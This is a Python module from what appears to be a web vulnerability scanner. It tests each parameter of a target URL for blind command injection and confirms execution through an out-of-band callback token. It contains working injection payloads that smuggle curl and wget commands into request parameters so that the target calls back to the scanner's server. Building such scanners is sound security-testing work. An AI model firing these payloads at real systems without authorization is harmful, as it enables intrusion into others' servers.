import asyncio
import os

from awap.engines.attack.base import AttackModule
from awap.core.config import settings
from awap.core.oast import oast_manager


class CmdInjectionModule(AttackModule):
    module_id = "cmd_injection"
    vuln_class = "COMMAND_INJECTION"

    async def run(self, url: str, params: list[dict], context=None) -> list[dict]:
        findings = []
        oast_base = settings.OAST_SERVER or os.getenv(
            "AWAP_OAST_URL", "http://localhost:8000/api/v1/oast/callback"
        )
        for param in params:
            token = oast_manager.generate_token(
                str(context.scan_id if context else "scan"), "cmd_injection"
            )
            oast_url = f"{oast_base.rstrip('/')}/{token}"
            payloads = [
                f"; curl {oast_url} ;",
                f"| wget {oast_url} |",
                f"`curl {oast_url}`",
            ]
            for payload in payloads:
                try:
                    await self.send_payload(
                        url, "GET", payload, param["name"], param["type"], context
                    )
                except Exception:
                    pass
            await asyncio.sleep(2)
            if oast_manager.verify_interaction(token):
                findings.append({
                    "vuln_class": "COMMAND_INJECTION",
                    "url": url,
                    "method": "GET",
                    "param": param["name"],
                    "payload": payloads[0],
                    "evidence": "OAST callback confirms blind command execution",
                    "severity": "CRITICAL",
                    "cvss": 10.0,
                    "confidence": 0.95,
                    "confirmed": True,
                })
        return findings
